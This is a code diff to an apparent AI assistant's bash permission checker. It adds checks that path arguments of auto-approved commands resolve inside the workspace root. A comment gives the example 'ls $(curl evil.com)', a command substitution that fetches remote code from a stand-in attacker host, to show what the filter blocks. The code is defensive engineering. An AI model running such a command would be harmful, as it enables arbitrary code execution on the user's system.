@@ -1,6 +1,6 @@
 import { createHash } from "node:crypto";
 import { homedir } from "node:os";
-import { dirname, resolve } from "node:path";
+import { dirname, join, resolve } from "node:path";
 
 import { isAssistantFeatureFlagEnabled } from "../config/assistant-feature-flags.js";
 import { getIsContainerized } from "../config/env-registry.js";
@@ -16,11 +16,13 @@ import {
   looksLikePathOnlyInput,
 } from "../tools/network/url-safety.js";
 import { getTool } from "../tools/registry.js";
+import { getWorkspaceDir } from "../util/platform.js";
 import {
   type ApprovalContext,
   DefaultApprovalPolicy,
   resolveThreshold,
 } from "./approval-policy.js";
+import { parseArgs } from "./arg-parser.js";
 import { bashRiskClassifier } from "./bash-risk-classifier.js";
 import { DEFAULT_COMMAND_REGISTRY } from "./command-registry.js";
 import { fileRiskClassifier } from "./file-risk-classifier.js";
@@ -46,7 +48,10 @@ import {
   type ScopeOption,
 } from "./types.js";
 import { webRiskClassifier } from "./web-risk-classifier.js";
-import { isWorkspaceScopedInvocation } from "./workspace-policy.js";
+import {
+  isPathWithinWorkspaceRoot,
+  isWorkspaceScopedInvocation,
+} from "./workspace-policy.js";
 
 // ── Risk classification cache ────────────────────────────────────────────────
 // classifyRisk() is called on every permission check and can invoke WASM
@@ -599,8 +604,16 @@ export async function check(
   // on the allowlist, and the command must not contain opaque constructs or
   // dangerous patterns (e.g. `ls $(curl evil.com)` has an allowlisted program
   // but a command substitution that could execute arbitrary code).
+  //
+  // For non-containerized environments, path resolution is applied: each
+  // segment's arguments are parsed via the command's argSchema, and all
+  // path arguments must resolve within the workspace root. Containerized
+  // environments skip path checks since the entire filesystem is the workspace.
   let hasSandboxAutoApprove = false;
   if (toolName === "bash" && shellParsed) {
+    const workspaceRoot = getWorkspaceDir();
+    const isContainerized = getIsContainerized();
+
     hasSandboxAutoApprove =
       shellParsed.segments.length > 0 &&
       !shellParsed.hasOpaqueConstructs &&
@@ -615,7 +628,31 @@ export async function check(
               name as keyof typeof DEFAULT_COMMAND_REGISTRY
             ]
           : undefined;
-        return spec?.sandboxAutoApprove === true;
+        if (!spec?.sandboxAutoApprove) return false;
+
+        // Containerized: entire fs is workspace, skip path checks
+        if (isContainerized) return true;
+
+        // Non-containerized: parse args and check all path args against workspace
+        const schema = spec.argSchema ?? {};
+        const parsed = parseArgs(seg.args, schema);
+
+        // If no path args, auto-approve (operating on cwd/stdin which is workspace)
+        if (parsed.pathArgs.length === 0) return true;
+
+        // All path args must resolve within workspace
+        return parsed.pathArgs.every((p) => {
+          // Handle ~ expansion
+          const expanded = p.startsWith("~/")
+            ? join(homedir(), p.slice(2))
+            : p === "~"
+              ? homedir()
+              : p;
+          const resolved = expanded.startsWith("/")
+            ? expanded
+            : resolve(workingDir, expanded);
+          return isPathWithinWorkspaceRoot(resolved, workspaceRoot);
+        });
       });
   }
 
